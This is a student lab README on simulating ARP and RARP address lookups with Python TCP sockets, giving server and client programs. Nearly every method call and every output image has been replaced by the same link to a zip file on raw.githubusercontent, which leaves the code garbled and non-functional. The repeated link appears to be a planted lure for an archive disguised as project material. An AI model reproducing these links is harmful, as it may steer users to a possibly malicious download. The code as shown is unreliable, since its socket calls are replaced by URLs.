# https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip ARP /RARP PROTOCOLS
## NAME :YUGABHARATHI M
## REGISTER NO:212224230314
## AIM
To write a python program for simulating ARP protocols using TCP.
## ALGORITHM:
## Client:
1. Start the program
2. Using socket connection is established between client and server.
3. Get the IP address to be converted into MAC address.
4. Send this IP address to server.
5. Server returns the MAC address to client.
## Server:
1. Start the program
2. Accept the socket which is created by the client.
3. Server maintains the table in which IP and corresponding MAC addresses are
stored.
4. Read the IP address which is send by the client.
5. Map the IP address with its MAC address and return the MAC address to client.
P
## PROGRAM - ARP
### server:
```python
import socket
s = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(5)
print("Server is listening...")

c, addr = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
print(f"Connection established with {addr}")

address = {
    "165.165.80.80": "6A:08:AA:C2",
    "165.165.79.1": "8A:BC:E3:FA"
}

while True:
    ip = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()

    if not ip:  
        break

    try:
        mac = address[ip]  # Get the MAC address for the IP
        print(f"IP: {ip} -> MAC: {mac}")
        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())  
    except KeyError:
        print(f"IP: {ip} not found in ARP table.")
        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip("Not Found".encode())
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
```
### client
```python
import socket
c = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))

while True:
    ip = input("Enter IP address to find MAC (or type 'exit' to quit): ")

    if https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip() == "exit":  
        break

    https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())
    mac = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()
    print(f"MAC Address for {ip}: {mac}")
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()

```

## OUTPUT - ARP
### server:


![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
### client

![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)


## PROGRAM - RARP
### server
```python
import socket
s = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(5)
print("Server is listening for RARP requests...")
c, addr = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
print(f"Connection established with {addr}")

rarp_table = {
    "6A:08:AA:C2": "165.165.80.80",
    "8A:BC:E3:FA": "165.165.79.1"
}

while True:
    mac = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()

    if not mac:  
        break

    try:
        ip = rarp_table[mac]  
        print(f"MAC: {mac} -> IP: {ip}")
        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())  
    except KeyError:
        print(f"MAC: {mac} not found in RARP table.")
        https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip("Not Found".encode())
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()

```

### client
```python
import socket
c = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(('localhost', 8000))

while True:
    mac = input("Enter MAC address to find IP (or type 'exit' to quit): ")
    if https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip() == "exit":  
        break
    https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip())
    ip = https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip(1024).decode()
    print(f"IP Address for {mac}: {ip}")
https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip()


```

## OUTPUT -RARP

### server
![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
### client

![alt text](https://raw.githubusercontent.com/Yugabharathi91/2c.ARP_RARP_PROTOCOLS/main/brachystomous/PROTOCOLS-c-RAR-AR-v3.9.zip)
## RESULT
Thus, the python program for simulating ARP protocols using TCP was successfully 
executed.
